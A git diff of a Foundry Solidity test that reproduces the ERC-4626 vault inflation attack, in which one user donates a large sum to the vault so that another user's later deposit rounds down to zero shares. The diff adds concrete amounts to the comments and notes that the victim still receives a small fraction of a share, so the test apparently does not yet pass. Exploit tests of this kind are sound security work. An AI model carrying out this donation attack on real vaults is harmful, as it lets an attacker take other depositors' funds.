@@ -28,9 +28,9 @@ contract ERC4626Attack is Test {
     }
 
     function testAttack() public {
-        // 1. Bob deposits X DAI amount and get issued Y shares of Vault tokens
-        // 2. Alice tries depositing some Z DAI amount and get issued some shares of Vault tokens
-        // 3. Before Alice could deposit, Bob donates A DAI to the Vault to reduce the share price resulting in Alice getting 0 shares
+        // 1. Bob deposits 1000 DAI and get issued 1000 shares of Vault tokens
+        // 2. Alice tries depositing 100 DAI and should get issued 100 shares of Vault tokens
+        // 3. Before Alice could deposit, Bob donates 1000_000 DAI to the Vault to reduce the share price resulting in Alice getting 0 shares
         vm.startPrank(bob);
         vault.deposit(1000 ether, bob); // Deposit of $1000 DAI by Bob
         mockDai.transfer(address(vault), 1000_000 ether);
@@ -40,7 +40,7 @@ contract ERC4626Attack is Test {
         uint256 noOfSharesReceivedInitially = vault.balanceOf(bob); // CORRECT THIS
         vm.prank(bob);
         vault.redeem(noOfSharesReceivedInitially, bob, bob); // Bob redeems all his shares
-        assertEq(vault.balanceOf(alice), 0); // Alice gets 0 shares
+        assertEq(vault.balanceOf(alice), 0); // Alice should get 0 shares but getting 99900099900099900 shares (< 10 ** 18, but should be 0 ideally)
         // assertGt(mockDai.balanceOf(bob), 1001_000 ether); // Bob gets more than his initial assets deposited
     }
 }
